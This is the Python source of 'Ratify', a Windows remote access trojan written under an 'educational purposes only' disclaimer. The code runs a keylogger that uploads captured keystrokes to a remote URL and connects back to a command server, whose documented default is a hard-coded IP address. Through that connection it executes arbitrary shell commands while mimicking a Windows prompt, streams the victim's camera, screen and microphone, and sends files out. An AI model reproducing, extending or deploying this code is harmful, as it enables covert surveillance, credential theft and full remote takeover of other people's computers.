"""
Ratify Script Documentation
===================================
**Important: This script is intended for educational purposes only. It should be used responsibly and with the explicit consent of the target machine's owner. Unauthorized or malicious use of this script is strictly prohibited and may violate applicable laws and regulations.**

This Python script serves as a remote control utility for performing various tasks on a Windows machine. It provides functionality for keylogging, displaying warnings, file uploading, and audio/video streaming. The script can be executed with command-line arguments to control its behavior.

Usage:
------
    python ratify.py [options]

Options:
--------
    -warning        Show a warning message.
    -logger         Start a keylogger to record keystrokes.
    -upload         Upload files to a specified server.
    -stream         Start audio or video streaming.
    -filepath       Path to the file to be uploaded (required for -upload).
    -uploadlink     Custom upload link for file uploads (required for -upload).
    -ip             Server IP address for remote control (default: 147.185.221.16).
    -port           Server port for remote control (default: 42700).
    -ips            Secondary server IP address for streaming (default: 147.185.221.16).
    -ps             Secondary server port for streaming (default: 2493).
    -select         Select streaming option (1 for audio, 2 for screen share, 3 for camera).

Module Dependencies:
---------------------
- socket
- subprocess
- os
- time
- platform
- winsound
- argparse
- sys
- ctypes
- datetime
- threading
- requests
- vidstream
- random
- tkinter
- pynput.keyboard
"""

__author__ = "Pangilinan, Ar Jay"
__email__ = "jaytechph0@gmail.com"
__status__ = "planning"

import socket
import subprocess
import os
import time
import platform
import winsound
import argparse
import sys
import ctypes
import datetime
import threading
import requests
import vidstream
import random
import configparser
import tkinter as tk
from tkinter import messagebox
from pynput.keyboard import Key, Listener

# Define command line arguments
parser = argparse.ArgumentParser(description="Remote Control Script")
parser.add_argument("-warning", action="store_true", help="Show a warning message")
parser.add_argument("-logger", action="store_true", help="Start a keylogger")
parser.add_argument("-upload", action="store_true", help="Upload file <-filepath> <-uploadlink>")
parser.add_argument("-stream", action="store_true", help="Start streaming")
parser.add_argument("-filepath", type=str, help="Path to file")
parser.add_argument("-uploadlink", type=str, help="Custom upload link")
parser.add_argument("-ip", type=str, help="Server IP address")
parser.add_argument("-port", type=int, help="Server port")
parser.add_argument("-ips", type=str, help="Secondary server IP address")
parser.add_argument("-ps", type=int, help="Secondary server port")
parser.add_argument("-select", type=int, help="Select streaming option")
args = parser.parse_args()

# Default server and port settings
ip_default = ""
port_default = 0
ip_stream = ""
port_stream = 0
upload_file = ""

# Define the RemoteControl class
class RemoteControl:
    """
    The RemoteControl class encapsulates the functionality of the remote control script.
    
    Methods:
        - __init__: Initialize the RemoteControl object.
        - get_capslock_state: Get the state of the Caps Lock key.
        - on_press: Handle key presses for the keylogger.
        - logger: Start the keylogger.
        - warning: Show a warning message.
        - get_windows_version: Get information about the Windows version.
        - stream: Start audio or video streaming.
        - upload: Upload log files to a server.
        - main: Main functionality of the remote control.
    """
    # Initialize the RemoteControl object
    def __init__(self):
        self.mw = tk.Tk()
        self.mw.withdraw()
        self.mw.attributes("-topmost", True)
        self.clc = 0
        self.ml = 100
        self.caps_lock_state = self.get_capslock_state()
        self.log_dir = os.path.dirname(os.path.abspath(__file__))
        self.log_file = os.path.join(self.log_dir, "keylogs.txt")
        self.idf = os.path.join(self.log_dir, "id.txt")
        self.MAX_ATTEMPTS = 5
        self.keylogger_active = False
        
        if not os.path.exists(self.log_file):
            with open(self.log_file, "w") as file:
                file.write("Log file created.\n")
                
        if not os.path.exists(self.idf):
            num = random.randint(10000, 99999)
            with open("id.txt", "w") as file:
                file.write(str(num))
                
        self.prompt = os.getcwd() + ">"
        self.version = self.get_windows_version()
        
    # Get the state of the Caps Lock key
    def get_capslock_state(self):
        return ctypes.windll.user32.GetKeyState(0x14) != 0
    
    # Handle key presses for the keylogger
    def on_press(self, key):
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if key == Key.caps_lock:
                self.caps_lock_state = not self.caps_lock_state
            elif key.char is not None:
                if self.caps_lock_state:
                    key = key.char.upper()

                try:
                    with open(self.log_file, "a") as f:
                        f.write(f'[{timestamp}]: {key}\n')
                except Exception as e:
                    print(f'Error while writing to the log file: {e}')
            self.clc += 1
            if self.clc >= self.ml:
                self.upload()
                self.clc = 0
        except Exception as e:
            try:
                with open(self.log_file, "a") as f:
                    f.write(f'[{timestamp}]: {key}\n')
            except Exception as e:
                print(f'Error while writing to the log file: {e}')
                
    # Start the keylogger
    def logger(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    # Show a warning message
    def warning(self, message=None):
        if message is None:
            message = "Setup config file"

        try:
            winsound.PlaySound('uac_sound.wav', winsound.SND_FILENAME | winsound.SND_ASYNC)
        except Exception as e:
            print(f"Error playing sound: {e}")

        messagebox.showwarning("Warning", message)

    def config(self):
        global ip_stream, port_stream, ip_default, port_default, upload_file
        config = configparser.ConfigParser()

        # Define config paramether
        if os.path.exists("config.ini"):
            config.read('config.ini')
            ip_stream = config.get('StreamingServer', 'ip')
            port_stream = config.getint('StreamingServer', 'port')
            
            ip_default = config.get('ShellServer', 'ip')
            port_default = config.getint('ShellServer', 'port')
            
            upload_file = config.get('UploadLink', 'link')
            
            self.main()
        else:
            config.add_section('ShellServer')
            config.set('ShellServer', 'ip', '127.0.0.1')
            config.set('ShellServer', 'port', '22')
            
            config.add_section('StreamingServer')
            config.set('StreamingServer', 'ip', '127.0.0.1')
            config.set('StreamingServer', 'port', '23')
            
            config.add_section('UploadLink')
            config.set('UploadLink', 'link', 'http://example.com/upload.php')
            
            with open('config.ini', 'w') as configfile:
                config.write(configfile)
                
            self.warning()
            sys.exit(0)
            
    # Get the Windows version information
    def get_windows_version(self):
        try:
            version_info = platform.win32_ver()
            return version_info[1]
        except Exception as e:
            return str(e)

    # Start streaming audio or video
    def stream(self, select=0, server=None, port=None):
        if server is None:
            server = ip_stream
            port = port_stream
        else:
            server = server
            port = port

        if select == 1:
            client = vidstream.AudioSender(server, port)
        elif select == 2:
            client = vidstream.ScreenShareClient(server, port)
        elif select == 3:
            client = vidstream.CameraClient(server, port)
        else:
            client = vidstream.ScreenShareClient(server, port)

        try:
            client.start_stream()
        except Exception:
            pass

    # Upload log files to a server
    def upload(self, filepath = None, url=None):
        try:
            if not filepath:
                filepath = self.log_file
                
            if not url:
                url = upload_file
                
            with open(filepath, 'rb') as file:
                files = {'file': (filepath, file)}
                requests.post(url, files=files)
                self.client_socket.send((self.prompt).encode('utf-8'))
        except Exception:
            pass
        
    # Main functionality of the remote control
    def main(self):
        """
    Main functionality of the remote control.

    This method establishes a connection to a remote control server and processes commands received from the server.

    Steps:
        1. Set initial command prompt and Windows version.
        2. Retrieve the content of the "id.txt" file.
        3. Prepare initial data to send to the remote control server.
        4. Attempt to establish a connection to the remote control server.
        5. Receive and process commands from the remote control server.
        6. Handle commands such as changing directories, displaying warnings, starting/stopping keylogger,
           streaming audio/video, uploading files, and executing shell commands.
        7. Close the connection when requested.

    This method processes custom options specified via command-line arguments.
    Options for CMD:
        --------
        warning                             Show a warning message.
        logger                              Start a keylogger to record keystrokes. if want to run in background "logger false"
        copy                                Upload files to a specified server. required file select example "upload id.txt"
        sharescreen, camera, audio          Example "camera" or if want to set custom ip and port "camera 127.0.0.1 22"
        exit                                If want to exit the connection
        """
        # Set initial command prompt and Windows version
        prompt = os.getcwd() + ">"
        version = self.get_windows_version()
        
        # Get the content of the "id.txt" file
        cmd_command = 'type ' + self.idf
        completed_process = subprocess.run(cmd_command, shell=True, stdout=subprocess.PIPE, text=True)
        idr = completed_process.stdout.strip()

        # Prepare initial data to send to the remote control server
        initial_data = f"""
Microsoft Windows [Version {version}]
(c) Microsoft Corporation. All rights reserved.

{prompt}"""

        attempt = 0
        
        # Attempt to establish a connection to the remote control server
        while attempt < self.MAX_ATTEMPTS:
            try:
                # Receive and process commands from the remote control server
                self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client_socket.connect((ip_default, port_default))
                self.client_socket.send(idr.encode())
                time.sleep(5)
                self.client_socket.send(initial_data.encode('utf-8'))
                
                while True:
                    data = self.client_socket.recv(1024).decode('utf-8')
                    if not data: break
    
                    if data.startswith("cd"):
                        # Change directory command
                        new_dir = data[3:].strip()
                        if not new_dir:
                            self.client_socket.send((prompt).encode('utf-8'))
                        else:
                            try:
                                os.chdir(new_dir)
                                prompt = os.getcwd() + ">"
                                self.client_socket.send((prompt).encode('utf-8'))
                            except Exception:
                                self.client_socket.send(("The system cannot find the path specified.\n" + prompt).encode('utf-8'))
                    elif data.startswith("warning"):
                        # Display a warning message
                        parts = data.split(' ', 1)
                        if len(parts) == 2:
                            _, message = parts
                        else:
                            message = None
    
                        self.warning(message)
                        self.client_socket.send((prompt).encode('utf-8'))
    
                    elif data.startswith("keylog"):
                        # Start or stop the keylogger
                        parts = data.split()
                        if len(parts) == 2:
                            command, func = parts
                            if func == "false":
                                if not self.keylogger_active:
                                    self.keylogger_active = True
                                    self.keylog = threading.Thread(target=self.logger)
                                    self.keylog.start()
                        else:
                            if not self.keylogger_active:
                                self.keylogger_active = True
                                self.keylog = threading.Thread(target=self.logger, daemon=True)
                                self.keylog.start()
                                
                        self.client_socket.send((prompt).encode('utf-8'))
                    elif data.startswith("camera"):
                        # Start streaming from the camera
                        parts = data.split()
                        if len(parts) == 3:
                            command, ip_address, port_str = parts
                            try:
                                port = int(port_str)
                                camera = threading.Thread(target=self.stream, args=(3, ip_address, port), daemon=True)
                                camera.start()
                            except Exception:
                                pass
                        else:
                            camera = threading.Thread(target=self.stream)
                            camera.start()
                        self.client_socket.send((prompt).encode('utf-8'))
                    elif data.startswith("sharescreen"):
                        # Start screen sharing
                        parts = data.split()
                        if len(parts) == 3:
                            command, ip_address, port_str = parts
                            try:
                                port = int(port_str)
                                sharescreen = threading.Thread(target=self.stream, args=(2, ip_address, port), daemon=True)
                                sharescreen.start()
                            except Exception:
                                pass
                        else:
                            sharescreen = threading.Thread(target=self.stream)
                            sharescreen.start()
                        self.client_socket.send((prompt).encode('utf-8'))
                    elif data.startswith("audiolisten"):
                        # Start listening to audio
                        parts = data.split()
                        if len(parts) == 3:
                            command, ip_address, port_str = parts
                            try:
                                port = int(port_str)
                                audiolisten = threading.Thread(target=self.stream, args=(1, ip_address, port), daemon=True)
                                audiolisten.start()
                            except Exception:
                                pass
                        else:
                            audiolisten = threading.Thread(target=self.stream)
                            audiolisten.start()
                        self.client_socket.send((prompt).encode('utf-8'))
                    elif data.startswith("copy"):
                        # Copy a file and upload it
                        parts = data.split()
                        if len(parts) == 3:
                            command, subdirectory, website = parts
                            file_dir = os.path.join(os.getcwd(), subdirectory)
                            self.upload(file_dir, website)
                        if len(parts) == 2:
                            command, subdirectory = parts
                            file_dir = os.path.join(os.getcwd(), subdirectory)
                            self.upload(file_dir)
                        self.client_socket.send((prompt).encode('utf-8'))
    
                    elif data.startswith("exit"):
                        # Close the connection and exit the program
                        self.client_socket.close()
                        sys.exit()
                    else:
                        # Execute a command and send the output back
                        try:
                            output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                        except subprocess.CalledProcessError as e:
                            output = str(e.output)
                        self.client_socket.send((output + '\n' + prompt).encode('utf-8'))
                        
            except Exception:
                pass
            
            self.client_socket.close()
            attempt += 1
            time.sleep(5)
            print(attempt)

        if attempt >= self.MAX_ATTEMPTS:
            print("Failed to establish a connection after multiple attempts.")

if __name__ == "__main__":
    rc = RemoteControl()
    
    # Args conditions
    if args.ip and args.port:
        ip_default = args.ip
        port_default = args.port
    if args.ips and args.ps:
        ip_stream = args.ips
        port_stream = args.ps
    if args.warning:
        rc.warning()
    if args.logger:
        keylog = threading.Thread(target=rc.logger)
        keylog.start()
    if args.upload:
        if not args.filepath and not args.uploadlink:
            rc.upload()
        else:
            if args.filepath and args.uploadlink:
                path = args.filepath
                link = args.uploadlink
            elif args.filepath:
                path = args.filepath
                link = None
            elif args.uploadlink:
                path = None
                link = args.uploadlink
                    
            rc.upload(filepath=path, url=link)
    if args.stream:
        num = args.select
        rc.stream(num)
    if not args.warning and not args.logger and not args.upload and not args.stream:
        rc.config()